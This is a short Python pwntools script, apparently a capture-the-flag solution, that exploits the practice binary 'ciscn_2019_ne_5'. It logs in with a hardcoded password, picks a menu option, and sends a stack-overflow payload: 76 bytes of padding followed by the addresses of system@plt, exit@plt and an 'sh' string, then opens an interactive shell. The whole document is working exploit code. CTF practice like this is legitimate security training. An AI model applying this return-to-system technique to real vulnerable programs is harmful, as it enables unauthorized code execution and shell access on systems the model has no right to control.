#Made by fly_autumn
#x86 ret2rop
from pwn import *
p = process("./ciscn_2019_ne_5")
elf = ELF("./ciscn_2019_ne_5")
context(os="linux",arch="i386")

p.recvuntil(b"password:")
p.sendline(b"administrator")
p.recvuntil(b"Exit\n:")
p.sendline(b"1")
p.recvuntil(b"info:")
offset = 76
exit_plt = 0x80484e0
sh_addr = 0x80482ea
system_plt = 0x80484d0
payload = b"A"*offset + p32(system_plt) + p32(exit_plt) + p32(sh_addr)
p.sendline(payload)
p.recvuntil(b"Exit\n:")
p.sendline(b"4")

p.interactive()
